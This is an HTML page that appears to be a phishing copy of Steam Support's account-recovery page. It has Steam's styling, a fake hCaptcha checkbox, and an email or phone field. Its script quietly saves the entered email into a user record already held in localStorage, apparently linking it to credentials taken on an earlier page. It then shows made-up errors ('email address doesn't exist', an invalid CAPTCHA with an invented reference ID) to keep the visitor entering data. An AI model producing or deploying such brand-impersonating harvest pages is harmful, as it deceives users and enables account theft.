<!DOCTYPE html>
<html>
<head>
  <title>Welcome to Steam</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>

<body class="min-h-screen bg-[#182638] text-white">
  <script>
    function emailError(){
      if(document.getElementById("checkbox").checked){
        document.getElementById("emailErrorContainer").innerHTML = ""
        let template = document.getElementById("emailError")
        let clone = template.content.cloneNode(true)
        document.getElementById("emailErrorContainer").appendChild(clone)

        document.getElementById("email").classList.add("border", "border-red-400")
      }
    }

    function humanCheckError(){
      if(!document.getElementById("checkbox").checked){
        document.getElementById("humanCheckErrorContainer").innerHTML = ""
        let template = document.getElementById("humanCheckError")
        let clone = template.content.cloneNode(true)
        document.getElementById("humanCheckErrorContainer").appendChild(clone)
      }
    }

    function removeError(){
      document.getElementById("emailErrorContainer").innerHTML = ""
      document.getElementById("humanCheckErrorContainer").innerHTML = ""
      document.getElementById("email").classList.remove("border", "border-red-400")
    }

    function addEmailAddress(){
      let email = document.getElementById("email").value
      let key = localStorage.key(localStorage.length - 1)
      let user = JSON.parse(localStorage.getItem(key))
      user.email = email
      localStorage.setItem(key, JSON.stringify(user))
    }
  </script>

  <!-- Top Bar -->
  <div><img src="support.png"></div>

  <main class="">
    <div class="pl-57 pt-5">
      <p class="text-2xl pb-1">Steam Support</p>
      <div class="text-gray-400 mb-5">Home &gt; Find Account</div>

      <template id="humanCheckError">
        <div class="w-140 h-10 bg-[#490904] text-xs border border-red-600 mb-10">
          <p>Your response to the CAPTCHA appears to be incalid. Please re-verify that you're not robot below. (Reference ID: 8586831598690803)</p>
        </div>
      </template>

      <div id="humanCheckErrorContainer"></div>
      <!-- Card -->
      <div class="w-130 h-90 bg-[#101d2d]/70 px-6 py-6 shadow-xl">
        <h2 class="text-1xl text-[#66c0f4] mb-2">I forgot my Steam Account name or password</h2>
        <p class="mb-3">Enter your email address or phone number</p>
        <input type="text" class="w-[390px] h-10 bg-[#334b66] border border-[#56708c] outline-none px-3 mb-6" id="email" onclick="removeError()">

        <!-- Human check -->
        <div class="w-80 h-20 border border-gray-300 rounded bg-[#333333] flex items-center justify-between px-5 mb-9">
          <div class="flex items-center gap-5">
            <input type="checkbox" class="h-6 w-6" id="checkbox" onclick="removeError()">
            <span class="text-lg">I am human</span>
          </div>

          <div class="text-center text-xs text-gray-300">
            <div><center><img src="humancheck.png" class="w-10 h-8"></center></div>
            <div class="font-bold">hCaptcha</div>
            <div>Privacy · Terms</div>
          </div>
        </div>

        <div id="emailErrorContainer"></div>
        <template id="emailError">
          <p class="text-red-400">The email address doesn't exist.</p>
        </template>
        <button class="bg-[#275f86] hover:bg-[#3579a8] text-[#66c0f4] px-4 py-2 text-lg" onclick="emailError(); humanCheckError(); addEmailAddress()">Search</button>
      </div>
    </div>
  </main>
</body>
</html>
